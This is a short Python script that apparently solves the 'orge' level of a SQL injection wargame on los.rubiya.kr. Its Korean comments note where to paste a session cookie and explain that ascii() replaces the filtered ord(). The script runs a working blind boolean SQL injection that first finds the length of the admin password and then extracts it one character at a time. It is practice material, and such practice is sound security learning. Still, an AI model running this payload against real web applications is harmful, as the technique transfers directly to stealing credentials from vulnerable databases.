import urllib3
import requests

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw='||id='admin'%26%26"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

length = 0

for i in range(0,100):
    query = "length(pw)={}%23".format(i)
    req = requests.get(url+query, headers=header)
    #print(url+query)
    print("[+] send req length is {}".format(i))
    if "Hello admin" in req.text:
        length = i
        break

print(length)

ans=''
for i in range(1, length+1):
    for j in ch:
        query = "ascii(substr(pw,{},1))={}%23".format(i, ord(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "Hello admin" in req.text:
            print("[+] find password letter is {}".format(j))
            print("the letter is {}".format(i))
            ans += j
            break

print(ans)

#ord를 안쓴느 이유는 or을 필터링 하므로 ord를 못쓰고 ascii를 쓴다.


